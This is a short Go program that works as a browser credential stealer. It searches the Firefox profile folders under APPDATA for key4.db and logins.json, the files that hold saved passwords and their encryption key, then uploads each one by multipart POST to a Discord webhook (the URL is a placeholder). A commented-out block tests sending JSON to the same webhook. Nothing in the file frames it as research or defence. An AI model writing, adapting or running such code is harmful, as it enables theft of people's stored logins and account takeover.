package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func main() {

	/*values := map[string]string{"content": "John Doe"}
	json_data, err := json.Marshal(values)

	if err != nil {
		log.Fatal(err)
	}

	resp, err := http.Post("https://discord.com/api/webhooks/link/link", "application/json",
		bytes.NewBuffer(json_data))

	if err != nil {
		log.Fatal(err)
	}

	var res map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&res)

	fmt.Println(res["json"]) */


	var files []string

	root := (os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles")


	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

		if err != nil {

			fmt.Println(err)
			return nil
		}

		if !info.IsDir() && filepath.Base(path) == "key4.db" || filepath.Base(path) == "logins.json" {
			files = append(files, path)
		}

		return nil
	})

	if err != nil {
		log.Fatal(err)
	}

	 for _, file := range files {
		url := "https://discord.com/api/webhooks/link/link"
		request, _ := newfileUploadRequest(url, "file", file)
		client := &http.Client{}
		client.Do(request)
	}
	url := "https://discord.com/api/webhooks/link/link"
	request, _ := newfileUploadRequest(url, "file", "test.txt")
	client := &http.Client{}
	client.Do(request)
}

func newfileUploadRequest(uri string, paramName, path string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
	if err != nil {
		return nil, err
	}
	_, err = io.Copy(part, file)

	err = writer.Close()
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", uri, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req, err
}